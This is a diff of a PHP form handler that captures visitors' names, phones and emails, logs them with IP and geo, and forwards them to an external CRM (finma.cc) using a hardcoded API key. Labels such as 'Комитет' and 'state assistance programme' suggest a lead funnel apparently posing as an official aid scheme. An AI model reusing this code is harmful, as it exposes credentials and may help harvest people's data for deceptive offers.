@@ -8,9 +8,9 @@ use PhpOffice\PhpSpreadsheet\Writer\Xlsx;
 
 
 // SAVE DATA RIGTH AWAY
-$userName = isset($_POST['user_name']) ? $_POST['user_name'] : '';
-$userPhone = isset($_POST['user_phone']) ? formatPhoneNumber($_POST['user_phone']) : '';
-$userEmail = isset($_POST['user_email']) ? $_POST['user_email'] : '';
+$userName = isset($_POST['name']) ? $_POST['name'] : '';
+$userPhone = isset($_POST['phone']) ? formatPhoneNumber($_POST['phone']) : '';
+$userEmail = isset($_POST['email']) ? $_POST['email'] : '';
 
 writeLog('!!! SUBMIT: UserName: ' . $userName . '. userPhone: ' . $userPhone . '. userEmail: ' . $userEmail);
 
@@ -23,7 +23,7 @@ $source = isset($_COOKIE['source']) ? $_COOKIE['source'] : '';
 $geo = isset($_COOKIE['geo']) ? $_COOKIE['geo'] : '';
 $buyer = isset($_COOKIE['buyer']) ? $_COOKIE['buyer'] : '';
 $fbclid = isset($_COOKIE['fbclid']) ? $_COOKIE['fbclid'] : '';
-
+$acc = isset($_COOKIE['acc']) ? $_COOKIE['acc'] : '';
 
 $silent = 0;
 $user_ip = '';
@@ -45,14 +45,14 @@ if (empty($user_ip)) {
    $silent = 1;
 }
 
-$response = array('success' => false, 'errors' => array());
+$response = array('success' => false, 'errors' => array(), 'silent' => 0);
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // Getting data from the form
-   $userName = isset($_POST['user_name']) ? $_POST['user_name'] : '';
-   $userPhone = isset($_POST['user_phone']) ? formatPhoneNumber($_POST['user_phone']) : '';
-   $userEmail = isset($_POST['user_email']) ? $_POST['user_email'] : '';
+   $userName = isset($_POST['name']) ? $_POST['name'] : '';
+   $userPhone = isset($_POST['phone']) ? formatPhoneNumber($_POST['phone']) : '';
+   $userEmail = isset($_POST['email']) ? $_POST['email'] : '';
 
    /*
    * Check fraudulent IPs
@@ -125,19 +125,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
 
    // Check if the fields are filled in
-   if (isset($_POST['user_name'])) {
+   if (isset($_POST['name'])) {
       if (empty($userName)) {
-         $response['errors']['user-name'] = 'Поле обязательно для заполнения';
+         $response['errors']['name'] = 'Поле обязательно для заполнения';
       }
    }
-   if (isset($_POST['user_phone'])) {
+   if (isset($_POST['phone'])) {
       if (empty($userPhone)) {
-         $response['errors']['user-phone'] = 'Поле обязательно для заполнения';
+         $response['errors']['phone'] = 'Поле обязательно для заполнения';
       }
    }
-   if (isset($_POST['user_email'])) {
+   if (isset($_POST['email'])) {
       if (empty($userEmail)) {
-         $response['errors']['user-email'] = 'Поле обязательно для заполнения';
+         $response['errors']['email'] = 'Поле обязательно для заполнения';
       }
    }
 
@@ -147,7 +147,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
       exit;
    }
 
-   writeLog('User IP: ' . $user_ip . '. User phone: ' . $userPhone);
+   writeLog('User IP: ' . $user_ip . '. User phone: ' . $userPhone . 'GEO: ' . $geo);
 
    /*
    * Add user to the CRM
@@ -155,11 +155,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if ($silent !== 1) {
 
       $ch = curl_init();
-      curl_setopt($ch, CURLOPT_URL, 'https://kz.gy/http_post.php');
+      curl_setopt($ch, CURLOPT_URL, 'https://finma.cc/http_post.php');
 
       // Set the HTTP headers
       curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-         "Rest-Key: xYit1q59GQ7uj7D5csfZ",
+         "Rest-Key: xYit1q59GQ7uj7D5csfZV",
          "Content-Type: application/json"
       ));
 
@@ -177,7 +177,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
          'source' => $source,
          'landing' => 'Комитет',
          'kreo' => $kreo,
-         'coment' => 'Сорс: Программа государственной помощи',
+         'coment' => '',
       ];
 
       // Attach the POST data to the request
